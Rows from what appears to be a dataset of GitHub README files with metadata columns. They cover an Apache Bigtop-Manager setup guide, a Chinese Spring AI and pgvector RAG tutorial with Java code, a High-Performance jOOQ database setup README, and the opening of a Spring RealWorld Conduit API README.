       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an ""AS IS"" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
--->


# Bigtop-Manager

Bigtop-Manager is a platform for managing Bigtop components. Inspired by Apache Ambari.

## Prerequisites

JDK: Requires JDK 17 or 21  
Metadata DB: Mariadb or Mysql(8 or above)

### API-DOCS
[swagger-ui](http://localhost:8080/swagger-ui/index.html)

### Compile
```bash
mvn clean package -DskipTests
```

### Developer
1. Create Database which named ""bigtop_manager"", Configure DB connect name & password, default both are 'root'
2. Run SQL DDL Script at `bigtop-manager-server/src/main/resources/ddl/MySQL-DDL-CREATE.sql`
3. Insert Test SQL Data at `dev-support/example/bigtop_manager/user.sql`
4. Start bigtop-manager-server `bigtop-manager-server/src/main/java/org/apache/bigtop/manager/server/ServerApplication.java`
5. Start bigtop-manager-agent `similar with run bm-server`
6. Start bigtop-manager-ui `configure nodejs environmment, default folder is bigtop-manager-ui/node, then run with package.json`
7. Visit `http://localhost:5173/`, default login user & password are `""admin""`

### How to test a Service
> 1. Login
> 2. Create cluster ->Register host
> 3. Installation Services
> 4. Start Service
> 5. Stop Service

### API Testing
- request `http://localhost:8080/swagger-ui/index.html` to check swagger API Doc

### How to test bm-monitoring
1. Install [Prometheus LTS Version](https://github.com/prometheus/prometheus/releases/download/v2.45.3/prometheus-2.45.3.linux-amd64.tar.gz)
2. Configure prometheus.yml, add below code into `scrape_configs`
```
- job_name: ""bm-agent-host""
  metrics_path: ""/actuator/prometheus""
  static_configs:
    - targets: [""agent1 ip/hostname:8081"", ""agent2 ip/hostname:8081"", ...]
```
3. Configure Prometheus Query Info at `bigtop-manager-server/src/main/resources/application.yml`
```
monitoring:
  prometheus-host: ""http://localhost:9090""
  agent-host-job-name: ""bm-agent-host""
```",0,0,5,apache-2.0,94.0,"['platform', 'managing', 'bigtop', 'component', 'inspired', 'apache', 'ambari', 'prerequisite', 'jdk', 'requires', 'jdk', 'metadata', 'db', 'mariadb', 'mysql', 'compile', 'developer', 'create', 'database', 'named', 'configure', 'db', 'connect', 'name', 'password', 'default', 'run', 'sql', 'ddl', 'script', 'insert', 'test', 'sql', 'data', 'start', 'start', 'start', 'visit', 'default', 'login', 'user', 'password', 'test', 'service', 'login', 'create', 'cluster', 'register', 'host', 'installation', 'service', 'start', 'service', 'stop', 'service', 'api', 'testing', 'request', 'check', 'swagger', 'api', 'doc', 'test', 'install', 'prometheus', 'lts', 'version', 'configure', 'add', 'code', 'configure', 'prometheus', 'query', 'info']","['start', 'service', 'configure', 'test', 'jdk']",1,0,0,"['prerequisite', 'compile', 'developer', 'how', 'test', 'service', 'api', 'test', 'how', 'test']",8,"['test', 'how', 'prerequisite', 'compile', 'developer']",3,97.0,18.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:flatten-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,15.0,3.0,2651,16.869565217391305,5.134020618556701,"['swagger-ui -> http://localhost:8080/swagger-ui/index.html', 'Prometheus LTS Version -> https://github.com/prometheus/prometheus/releases/download/v2.45.3/prometheus-2.45.3.linux-amd64.tar.gz']",2
jianyuan1991/ragdemo,main,"
# Spring AI+Ollama+pgvector实现本地RAG

## 前言

之前写过一篇[Spring AI+Ollama本地环境搭建](https://www.bxmdm.com/archives/2024030801)的文章，本篇在此基础上进一步搭建本地RAG。RAG是目前大模型应用落地的一套解决方案，中文名叫检索增强，由于大语言模型有时效性和幻觉等局限性，使用RAG方案，先利用搜索技术从本地知识中搜索出想要的相关信息，在将相关信息组成prompt中上下文的一部分，在由大模型根据prompt进行回复。本次就构建一个demo，使用RAG技术构建一个文档问答的应用。如图所示，RAG文档问答的整体流程大致分成两个阶段：

1、数据准备，将待文本数据通过embedding模型转成文本向量，并存储到向量数据库中。

2、用户提问，将用户提出的文本通过embedding模型转成问题文本向量，并在向量库中进行搜索，搜索得到一些文本段落，将搜索到的文本段落组装成prompt去调用大模型来获得答案。

```mermaid
graph LR  
    
    user[User] --> question[问题]
    doc[文本数据] --> embedding[Embedding Model]  
    embedding --> docVector[文本向量]
    docVector --> VectorDatabase[向量数据库]
    question[问题] --> embedding[Embedding Model] 
    embedding[Embedding Model]  --> questionVector[问题向量]
    questionVector[问题向量] --> VectorDatabase[向量数据库]
    VectorDatabase[向量数据库] --> docParagraph[文本段落]
    docParagraph[文本段落] --> prompt[提示词]
    prompt[提示词] --> llm[大模型]
    llm[大模型] --> answer[答案]
    answer[答案] --> user[User]
    
    style doc fill:#98FB98;
    style docVector fill:#98FB98;
    style user fill:#FF8C00;
    style question fill:#FF8C00;
    style questionVector fill:#FF8C00;
    style docParagraph fill:#FF8C00;
    style prompt fill:#FF8C00;
    style answer fill:#FF8C00;
```

本次demo中，整体流程的业务逻辑都通过spring ai来实现，spring ai支持调用Ollama来实现chat和embedding，支持pgvector来作为向量数据存储和搜索，所以选择的模型和数据库信息如下：

模型运行工具：Ollama

embedding模型： mofanke/dmeta-embedding-zh（中文支持比较好）

大模型：qwen:7b（中文支持比较好）

向量数据库：pgvector（postgresql）



**工程完整代码:**

https://github.com/jianyuan1991/ragdemo

https://gitee.com/jianyuan/ragdemo

## 环境准备

### Ollama和模型

Ollama本地部署

下载qwen:7b:

```powershell
ollama run qwen:7b
```

*Ollama部署和qwen模型下载可以参考[Spring AI+Ollama本地环境搭建](https://www.bxmdm.com/archives/2024030801)*



下载embedding模型:

```powershell
ollama pull  mofanke/dmeta-embedding-zh
```

![安装dmeta-embedding-zh完成](./img/安装dmeta-embedding-zh完成.png)



### pgvector

pgvector是postgresql的一个扩展，使得postgresql能够存储和搜索向量数据，pgvector 提供 2 种类型的索引，IVFFlat 和 HNSW，都是近似最近邻 （ANN） 索引，索引可以加快搜索相似向量的速度。以下是它们的主要区别：

![IVFFlat和HNSW的区别](./img/IVFFlat和HNSW区别.png)

另外pgvector 引入了三个可用于计算相似度的新运算符： <-> – 欧几里得距离、<#> – 负内积、<=> – 余弦距离

本次demo采用docker安装pgvector:

```
docker run --name pgvector \
    -e POSTGRES_PASSWORD=postgres \
    -p 5432:5432 \
	-d pgvector/pgvector:pg16
```



## 业务实现

### 数据准备

本次demo文本数据读取txt文件，spring ai中实现了TextReader用于读取txt文件，部分源码如下，比较简单，没有对文本内容进行解析（文本内容的解析在RAG中很重要，直接影像RAG中文本信息的搜索效果）。

```java
String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

// Inject source information as a metadata.
this.customMetadata.put(CHARSET_METADATA, this.charset.name());
this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());

return List.of(new Document(document, this.customMetadata));
```

本次demo重新实现TXT的读取，根据回车符对文本内容进行分段，并采用窗口模式对分段内容进行文档划分，可以先复制TextReader代码，新建“ParagraphTextReader”实现类，部分实现代码如下：

```java
/**
* 默认窗口大小，为1
*/
private static final int DEFAULT_WINDOW_SIZE = 1;

/**
* 窗口大小，为段落的数量，用于滚动读取
*/
private int windowSize = DEFAULT_WINDOW_SIZE;

public static final String START_PARAGRAPH_NUMBER = ""startParagraphNumber"";
public static final String END_PARAGRAPH_NUMBER = ""endParagraphNumber"";

/**
* 读取文本内容,并根据换行进行分段,采用窗口模式,窗口为段落的数量
*
* @return 文档信息列表
*/
@Override
public List<Document> get() {
    try {

        List<Document> readDocuments = new ArrayList();
        String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

        // Inject source information as a metadata.
        this.customMetadata.put(CHARSET_METADATA, this.charset.name());
        this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());
		
        //文本内容根据回车符进行分段
        List<String> paragraphs = Arrays.asList(document.split(""\n""));

        //采用窗口滑动读取分段内容
        int startIndex = 0;
        int endIndex = startIndex + this.windowSize;
        if (endIndex > paragraphs.size()) {
            readDocuments.add(this.toDocument(paragraphs, startIndex + 1, paragraphs.size()));
        } else {
            for (; endIndex <= paragraphs.size(); startIndex++, endIndex++) {
                readDocuments.add(this.toDocument(ListUtil.sub(paragraphs, startIndex, endIndex), startIndex + 1, endIndex));
            }
        }
        return readDocuments;
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}

/**
 * 封装段落成文档
 * @param paragraphList 段落内容列表
 * @param startParagraphNum 开始段落编码
 * @param endParagraphNum 结束段落编码
 * @return 文档信息
 */
private Document toDocument(List<String> paragraphList, int startParagraphNum, int endParagraphNum) {
    Document doc = new Document(String.join(""\n"", paragraphList));
    doc.getMetadata().putAll(this.customMetadata);
    doc.getMetadata().put(START_PARAGRAPH_NUMBER, startParagraphNum);
    doc.getMetadata().put(END_PARAGRAPH_NUMBER, endParagraphNum);
    return doc;
}
```



构建文件上传接口用来接收TXT文件，部分代码如下:

```java
@PostMapping(""/upload"")
public ResponseEntity upload(@RequestBody MultipartFile file) {
    documentService.uploadDocument(file);
    return ResponseEntity.ok(""success"");
}
```



documentService服务中实现文件的上传解析,并使用spring ai中的VectorStore存储数据，部分代码如下:

```java
@Autowired
private VectorStore vectorStore;

private static final String PATH = ""D:\\demo\\ai\\path\\"";

/**
 * 使用spring ai解析txt文档
 *
 * @param file
 * @throws MalformedURLException
 */
public void uploadDocument(MultipartFile file) {
    //保存file到本地
    String textResource = file.getOriginalFilename();
    //判断文件是否是TXT
    if (!textResource.endsWith("".txt"")) {
        throw new RuntimeException(""只支持txt格式文件"");
    }
    String filepath = PATH + textResource;
    File file1 = new File(filepath);
    if(file1.exists()){
        throw new RuntimeException(""文件已存在"");
    }
    try {
        file.transferTo(file1);
    } catch (Exception e) {
        e.printStackTrace();
    }
    List<Document> documentList = paragraphTextReader(file1);
    vectorStore.add(documentList);
}

private List<Document> paragraphTextReader(File file) {
    List<Document> docs = null;
    try {
        //这里我们设置滑动窗口大小为5
        ParagraphTextReader reader = new ParagraphTextReader(new FileUrlResource(file.toURI().toURL()), 5);
        reader.getCustomMetadata().put(""filename"", file.getName());
        reader.getCustomMetadata().put(""filepath"", file.getAbsolutePath());
        docs = reader.get();
    } catch (Exception e) {
        e.printStackTrace();
    }
    return docs;
}
```



### 用户提问

用户提问需要先根据问题从向量库中搜索响应的段落，由于demo中文本解析使用滑动窗口的模型进行读取，这里需要对搜索结果进行一次合并，代码部分如下：

```java
/**
 * 合并文档列表
 * @param documentList 文档列表
 * @return 合并后的文档列表
 */
private List<Document> mergeDocuments(List<Document> documentList) {
	List<Document> mergeDocuments = new ArrayList();
	//根据文档来源进行分组
	Map<String, List<Document>> documentMap = documentList.stream().collect(Collectors.groupingBy(item -> ((String) item.getMetadata().get(""source""))));
	for (Entry<String, List<Document>> docListEntry : documentMap.entrySet()) {
		//获取最大的段落结束编码
		int maxParagraphNum = (int) docListEntry.getValue()
				.stream().max(Comparator.comparing(item -> ((int) item.getMetadata().get(END_PARAGRAPH_NUMBER)))).get().getMetadata().get(END_PARAGRAPH_NUMBER);
		//根据最大段落结束编码构建一个用于合并段落的空数组
		String[] paragraphs = new String[maxParagraphNum];
		//用于获取最小段落开始编码
		int minParagraphNum = maxParagraphNum;
		for (Document document : docListEntry.getValue()) {
			//文档内容根据回车进行分段
			String[] tempPs = document.getContent().split(""\n"");
			//获取文档开始段落编码
			int startParagraphNumber = (int) document.getMetadata().get(START_PARAGRAPH_NUMBER);
			if (minParagraphNum > startParagraphNumber) {
				minParagraphNum = startParagraphNumber;
			}
			//将文档段落列表拷贝到合并段落数组中
			System.arraycopy(tempPs, 0, paragraphs, startParagraphNumber-1, tempPs.length);
		}
		//合并段落去除空值,并组成文档内容
		Document mergeDoc = new Document(ArrayUtil.join(ArrayUtil.removeNull(paragraphs), ""\n""));
		//合并元数据
		mergeDoc.getMetadata().putAll(docListEntry.getValue().get(0).getMetadata());
		//设置元数据:开始段落编码
		mergeDoc.getMetadata().put(START_PARAGRAPH_NUMBER, minParagraphNum);
		//设置元数据:结束段落编码
		mergeDoc.getMetadata().put(END_PARAGRAPH_NUMBER, maxParagraphNum);
		mergeDocuments.add(mergeDoc);
	}
	return mergeDocuments;
}

/**
	 * 根据关键词搜索向量库
	 *
	 * @param keyword 关键词
	 * @return 文档列表
	 */
public List<Document> search(String keyword) {
    return mergeDocuments(vectorStore.similaritySearch(keyword));
}
```



接下来构建封装prompt和调用大模型的方法，代码部分如下:

```java
/**
 * 问答,根据输入内容回答
 * @param message 输入内容
 * @return 回答内容
 */
public String chat(String message) {
	//查询获取文档信息
	List<Document> documents = search(message);
	
	//提取文本内容
	String content = documents.stream()
			.map(Document::getContent)
			.collect(Collectors.joining(""\n""));
	
	//封装prompt并调用大模型
	String chatResponse = ollamaChatClient.call(getChatPrompt2String(message, content));
	return chatResponse;
}

/**
 * 获取prompt
 * @param message 提问内容
 * @param context 上下文
 * @return prompt
 */
private String getChatPrompt2String(String message, String context) {
	String promptText = """"""
			请用仅用以下内容回答""%s"":
			%s
			"""""";
	return String.format(promptText, message, context);
}
```



再构建一个接口用于用于提问，代码部分如下:

```java
@GetMapping(""/chat"")
public ResponseEntity chat(@RequestParam String message) {
    return ResponseEntity.ok(documentService.chat(message));
}
```



配置信息

最后需要配置文件中配置向量数据库、embedding和大模型chat信息，application.yml配置部分如下:

```yaml
spring:
  datasource:
    url: jdbc:postgresql://192.168.3.220:5432/postgres
    username: postgres
    password: postgres
  ai:
    vectorstore:
      pgvector:
      	##embedding的向量维度，这里的768是根据nomic-embed-text返回的向量维度配置的
        dimensions: 768
    ollama:
      base-url: http://localhost:11434
      chat:
        model: qwen:7b
      embedding:
        model: nomic-embed-text
```



测试embedding模型的向量维度可以写一个测试方法来获取，代码部分如下：

```java
@Autowired
private EmbeddingClient embeddingClient;

@Test
void embeddingDimensionsTest(){
    //打印embedding模型的转换向量的维度
	System.out.println(embeddingClient.dimensions());
}
```





## 测试

### 上传数据

准备了springAI简介信息作为测试数据[Spring AI :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/index.html)，翻译如下：

```
Spring AI项目旨在简化包含人工智能功能的应用程序的开发，而不会造成不必要的复杂性。
该项目从著名的 Python 项目中汲取灵感，例如 LangChain 和 LlamaIndex，但 Spring AI 并不是这些项目的直接移植。 该项目成立的信念是，下一波生成式 AI 应用程序将不仅适用于 Python 开发人员，而且将在许多编程语言中无处不在。
Spring AI 的核心是提供抽象，作为开发 AI 应用程序的基础。 这些抽象具有多种实现，只需最少的代码更改即可轻松交换组件。
Spring AI 提供以下功能：
1.支持所有主要的模型提供商，如OpenAI，Microsoft，Amazon，Google和Huggingface。
2.支持的模型类型包括聊天和文本到图像，还有更多类型正在开发中。
3.跨 AI 提供商的可移植 API，用于聊天和嵌入模型。支持同步和流 API 选项。还支持下拉以访问特定于模型的功能。
4.将 AI 模型输出映射到 POJO。
5.支持所有主要的向量数据库提供商，例如 Azure Vector Search、Chroma、Milvus、Neo4j、PostgreSQL/PGVector、PineCone、Qdrant、Redis 和 Weaviate
6.跨 Vector Store 提供程序的可移植 API，包括一个类似 SQL 的新颖元数据过滤器 API，该 API 也是可移植的。
7.函数调用
8.用于 AI 模型和矢量存储的 Spring Boot 自动配置和启动器。
9.用于数据工程的 ETL 框架
通过此功能集，您可以实现常见用例，例如“文档问答”或“与文档聊天”。
概念部分提供了 AI 概念及其在 Spring AI 中的表示的高级概述。
“入门”部分介绍了如何创建第一个 AI 应用程序。 后续部分将采用以代码为中心的方法深入探讨每个组件和常见用例。
```



使用postman调用接口:

![postman测试文件上传](./img/postman测试文件上传.png)

本次demo使用向量数据库问pgvector，项目启动后，spring ai会连接pgvector自动创建vector_store表，当然也手动提前创建:

```sql
CREATE EXTENSION IF NOT EXISTS vector;
CREATE EXTENSION IF NOT EXISTS hstore;
CREATE EXTENSION IF NOT EXISTS ""uuid-ossp"";

CREATE TABLE IF NOT EXISTS vector_store (
	id uuid DEFAULT uuid_generate_v4() PRIMARY KEY,
	content text,
	metadata json,
	embedding vector(768) # 768 是embedding模型nomic-embed-text的维度
);

CREATE INDEX ON vector_store USING HNSW (embedding vector_cosine_ops);
```



测试过后可以连接数据库查询vector_store表的数据:

![pgvector数据查询](./img/pgvector数据查询.png)



### 问答测试

数据准备阶段已经测试完成，接下来可以测试问答，使用postman调用接口:

![postman测试问答](./img/postman测试问答.png)

*本地CPU运行大模型还是太慢了，一个接口跑了1分半多。*



## 总结

Spring AI结合Ollama和pgvector能很方便的构建一个RAG文档问答应用。RAG效果受到文档的拆分、embedding、段落搜索、prompt模板、大模型这些因素的影响，要想优化的话可以从这些方面去考虑。



**参考：**

[pgvector/pgvector: Open-source vector similarity search for Postgres (github.com)](https://github.com/pgvector/pgvector)

[PGvector :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/vectordbs/pgvector.html)

[Ollama Chat :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/clients/ollama-chat.html)

[Ollama Embeddings :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/embeddings/ollama-embeddings.html)

[qwen (ollama.com)](https://ollama.com/library/qwen)

[mofanke/dmeta-embedding-zh (ollama.com)](https://ollama.com/mofanke/dmeta-embedding-zh)",0,1,1,mit,0.0,"['spring', 'spring', 'http', 'http', 'spring', 'pgvector', 'paragraphtextreader', 'spring', 'ai', 'spring', 'ai', 'reference', 'spring', 'vector', 'similarity', 'search', 'postgres', 'pgvector', 'spring', 'ai', 'reference', 'ollama', 'chat', 'spring', 'ai', 'reference', 'ollama', 'embeddings', 'spring', 'ai', 'reference', 'qwen']","['spring', 'ai', 'reference', 'http', 'pgvector']",0,0,0,"['spring', 'pgvector']",13,"['spring', 'pgvector']",15,9.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,12377,153.5,7.395765472312703,"['Spring AI+Ollama本地环境搭建 -> https://www.bxmdm.com/archives/2024030801', 'Spring AI+Ollama本地环境搭建 -> https://www.bxmdm.com/archives/2024030801', 'Spring AI :: Spring AI Reference -> https://docs.spring.io/spring-ai/reference/index.html', 'pgvector/pgvector: Open-source vector similarity search for Postgres (github.com) -> https://github.com/pgvector/pgvector', 'PGvector :: Spring AI Reference -> https://docs.spring.io/spring-ai/reference/api/vectordbs/pgvector.html', 'Ollama Chat :: Spring AI Reference -> https://docs.spring.io/spring-ai/reference/api/clients/ollama-chat.html', 'Ollama Embeddings :: Spring AI Reference -> https://docs.spring.io/spring-ai/reference/api/embeddings/ollama-embeddings.html', 'qwen (ollama.com) -> https://ollama.com/library/qwen', 'mofanke/dmeta-embedding-zh (ollama.com) -> https://ollama.com/mofanke/dmeta-embedding-zh', 'User', '问题', '文本数据', 'Embedding Model', '文本向量', '向量数据库', '问题', 'Embedding Model', 'Embedding Model', '问题向量', '问题向量', '向量数据库', '向量数据库', '文本段落', '文本段落', '提示词', '提示词', '大模型', '大模型', '答案', '答案', 'User']",31
vladmihalcea/high-performance-jooq,main,"# High-Performance jOOQ

The High-Performance jOOQ repository provides code examples that demonstrate how jOOQ works.

### Are you struggling with application performance issues?

<a href=""https://vladmihalcea.com/hypersistence-optimizer/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://vladmihalcea.com/wp-content/uploads/2019/03/Hypersistence-Optimizer-300x250.jpg"" alt=""Hypersistence Optimizer"">
</a>

Imagine having a tool that can automatically detect if you are using JPA and Hibernate properly. No more performance issues, no more having to spend countless hours trying to figure out why your application is barely crawling.

Imagine discovering early during the development cycle that you are using suboptimal mappings and entity relationships or that you are missing performance-related settings. 

More, with Hypersistence Optimizer, you can detect all such issues during testing and make sure you don't deploy to production a change that will affect data access layer performance.

[Hypersistence Optimizer](https://vladmihalcea.com/hypersistence-optimizer/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp) is the tool you've been long waiting for!

#### Training

If you are interested in on-site training, I can offer you my [High-Performance Java Persistence training](https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp)
which can be adapted to one, two or three days of sessions. For more details, check out [my website](https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### Consulting

If you want me to review your application and provide insight into how you can optimize it to run faster, 
then check out my [consulting page](https://vladmihalcea.com/consulting/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### High-Performance Java Persistence Video Courses

If you want the fastest way to learn how to speed up a Java database application, then you should definitely enroll in [my High-Performance Java Persistence video courses](https://vladmihalcea.com/courses/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### High-Performance Java Persistence Book

Or, if you prefer reading books, you are going to love my [High-Performance Java Persistence book](https://vladmihalcea.com/books/high-performance-java-persistence?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp) as well.

<a href=""https://vladmihalcea.com/books/high-performance-java-persistence?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://i0.wp.com/vladmihalcea.com/wp-content/uploads/2018/01/HPJP_h200.jpg"" alt=""High-Performance Java Persistence book"">
</a>

<a href=""https://vladmihalcea.com/courses?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://i0.wp.com/vladmihalcea.com/wp-content/uploads/2018/01/HPJP_Video_Vertical_h200.jpg"" alt=""High-Performance Java Persistence video course"">
</a>

## Java

All examples require at least Java 17 because of the awesome [Text Blocks](https://openjdk.java.net/jeps/355) feature, which makes JPQL and SQL queries so much readable.

## Maven

You need to use Maven 3.6.2 or newer to build the project.

## IntelliJ IDEA

On IntelliJ IDEA, the project runs just fine. You will have to make sure to select Java 17 or newer.

## Database setup

The project uses various database systems for integration testing, and you can configure the JDBC connection settings using the
`DatasourceProvider` instances (e.g., `PostgreSQLDataSourceProvider`).

### Manual Database configuration

- PostgreSQL

    You can install PostgreSQL, and the password for the `postgres` user should be `admin`.

    Now you need to create a `high_performance_java_persistence` database.
    
- Oracle

    You need to download and install Oracle XE

    Set the `sys` password to `admin`

    Connect to Oracle using the ""sys as sysdba"" user and create a new user:
    
        alter session set ""_ORACLE_SCRIPT""=true;

        create user oracle identified by admin default tablespace users;

        grant dba to oracle;

        alter system set processes=1000 scope=spfile;

        alter system set sessions=1000 scope=spfile;
        
        ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;

    Open the `C:\app\${user.name}\product\21c\homes\OraDB21Home1\network\admin` folder where `${user.name}` is your current Windows username.
  
    Locate the `tnsnames.ora` and `listener.ora` files and change the port from `1522` to `1521` if that's the case. If you made these modifications,
    you need to restart the `OracleOraDB21Home1TNSListener` and `OracleServiceXE` Windows services.
  
- MySQL

    You should install MySQL 8, and the password for the `mysql` user should be `admin`.

    Now, you need to create a `high_performance_java_persistence` schema

    Besides having all privileges on this schema, the `mysql` user also requires select permission on `mysql.PROC`.
    
    If you don't have a `mysql` user created at database installation time, you can create one as follows:
    
    ````
    CREATE USER 'mysql'@'localhost';
    
    SET PASSWORD for 'mysql'@'localhost'='admin';
    
    GRANT ALL PRIVILEGES ON high_performance_java_persistence.* TO 'mysql'@'localhost';
    
    GRANT SELECT ON mysql.* TO 'mysql'@'localhost';
    
    FLUSH PRIVILEGES;
    ````

- SQL Server

    You can install SQL Server Express Edition with Tools. Choose mixed mode authentication and set the `sa` user password to `adm1n`.

    Open SQL Server Configuration Manager -> SQL Server Network Configuration and enable Named Pipes and TCP
    
    In the right pane of the TCP/IP option, choose Properties, then IP Addresses and make sure you Enable all listed IP addresses.
    You need to blank the dynamic TCP port value and configure the static TCP port 1433 for all IPs.
        
    Open SQL Server Management Studio and create the `high_performance_java_persistence` database
    
## Maven

> To build the project, don't use *install* or *package*. Instead, just compile test classes like this:
>
>    mvn clean test-compile
    
Afterward, just pick one test from the IDE and run it individually.

> Don't you run all tests at once (e.g. `mvn clean test`) because the test suite will take a very long time to complete.
>
> So, run the test you are interested in individually.

Enjoy learning more about jOOQ and database systems!
",0,0,1,apache-2.0,0.0,"['jooq', 'jooq', 'repository', 'provides', 'code', 'example', 'demonstrate', 'jooq', 'work', 'struggling', 'application', 'performance', 'issue', 'imagine', 'tool', 'automatically', 'detect', 'using', 'jpa', 'hibernate', 'properly', 'performance', 'issue', 'spend', 'countless', 'hour', 'trying', 'figure', 'application', 'barely', 'crawling', 'imagine', 'discovering', 'early', 'development', 'cycle', 'using', 'suboptimal', 'mapping', 'entity', 'relationship', 'missing', 'setting', 'hypersistence', 'optimizer', 'detect', 'issue', 'testing', 'make', 'sure', 'deploy', 'production', 'change', 'affect', 'data', 'access', 'layer', 'performance', 'hypersistence', 'optimizer', 'tool', 'long', 'waiting', 'training', 'interested', 'training', 'offer', 'java', 'persistence', 'training', 'adapted', 'one', 'two', 'three', 'day', 'session', 'detail', 'check', 'website', 'consulting', 'want', 'review', 'application', 'provide', 'insight', 'optimize', 'run', 'faster', 'check', 'consulting', 'page', 'java', 'persistence', 'video', 'course', 'want', 'fastest', 'way', 'learn', 'speed', 'java', 'database', 'application', 'definitely', 'enroll', 'java', 'persistence', 'video', 'course', 'java', 'persistence', 'book', 'prefer', 'reading', 'book', 'going', 'love', 'java', 'persistence', 'book', 'well', 'java', 'example', 'require', 'least', 'java', 'awesome', 'text', 'block', 'feature', 'make', 'jpql', 'sql', 'query', 'much', 'readable', 'maven', 'need', 'use', 'maven', 'newer', 'build', 'project', 'intellij', 'idea', 'intellij', 'idea', 'project', 'run', 'fine', 'make', 'sure', 'select', 'java', 'newer', 'database', 'setup', 'project', 'us', 'various', 'database', 'system', 'integration', 'testing', 'configure', 'jdbc', 'connection', 'setting', 'using', 'instance', 'manual', 'database', 'configuration', 'postgresql', 'install', 'postgresql', 'password', 'user', 'need', 'create', 'database', 'oracle', 'need', 'download', 'install', 'oracle', 'xe', 'set', 'password', 'connect', 'oracle', 'using', 'sys', 'sysdba', 'user', 'create', 'new', 'user', 'open', 'folder', 'current', 'window', 'username', 'locate', 'file', 'change', 'port', 'case', 'made', 'modification', 'need', 'restart', 'window', 'service', 'mysql', 'install', 'mysql', 'password', 'user', 'need', 'create', 'schema', 'besides', 'privilege', 'schema', 'user', 'also', 'requires', 'select', 'permission', 'user', 'created', 'database', 'installation', 'time', 'create', 'one', 'follows', 'sql', 'server', 'install', 'sql', 'server', 'express', 'edition', 'tool', 'choose', 'mixed', 'mode', 'authentication', 'set', 'user', 'password', 'open', 'sql', 'server', 'configuration', 'manager', 'sql', 'server', 'network', 'configuration', 'enable', 'named', 'pipe', 'tcp', 'right', 'pane', 'option', 'choose', 'property', 'ip', 'address', 'make', 'sure', 'enable', 'listed', 'ip', 'address', 'need', 'blank', 'dynamic', 'tcp', 'port', 'value', 'configure', 'static', 'tcp', 'port', 'ip', 'open', 'sql', 'server', 'management', 'studio', 'create', 'database', 'maven', 'build', 'project', 'use', 'install', 'package', 'instead', 'compile', 'test', 'class', 'like', 'mvn', 'clean', 'afterward', 'pick', 'one', 'test', 'ide', 'run', 'individually', 'run', 'test', 'test', 'suite', 'take', 'long', 'time', 'complete', 'run', 'test', 'interested', 'individually', 'enjoy', 'learning', 'jooq', 'database', 'system']","['java', 'database', 'user', 'sql', 'need']",2,0,0,"['jooq', 'are', 'struggle', 'application', 'performance', 'issue', 'training', 'consult', 'java', 'persistence', 'video', 'course', 'java', 'persistence', 'book', 'java', 'maven', 'intellij', 'idea', 'database', 'setup', 'manual', 'database', 'configuration', 'maven']",12,"['java', 'persistence', 'maven', 'database', 'jooq']",1,49.0,7.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:sql-maven-plugin,org.jooq.pro:jooq-codegen-maven,org.jooq:jooq-codegen-maven]",0.0,6.0,1.0,6451,25.38888888888889,5.390590809628009,"['Hypersistence Optimizer -> https://vladmihalcea.com/hypersistence-optimizer/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'High-Performance Java Persistence training -> https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'my website -> https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'consulting page -> https://vladmihalcea.com/consulting/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'my High-Performance Java Persistence video courses -> https://vladmihalcea.com/courses/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'High-Performance Java Persistence book -> https://vladmihalcea.com/books/high-performance-java-persistence?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp', 'Text Blocks -> https://openjdk.java.net/jeps/355']",7
sivaprasadreddy/spring-realworld-conduit-api,main,"# Spring Boot RealWorld Conduit API

![Spring Boot RealWorld Conduit API](logo.png)

**Spring Boot RealWorld Conduit API** implements the [API Endpoints](https://realworld-docs.netlify.app/docs/specs/backend-specs/endpoints) of [Conduit](https://github.com/gothinkster/realworld),
which is a Medium.com clone.

[![CI Build](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml/badge.svg)](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)
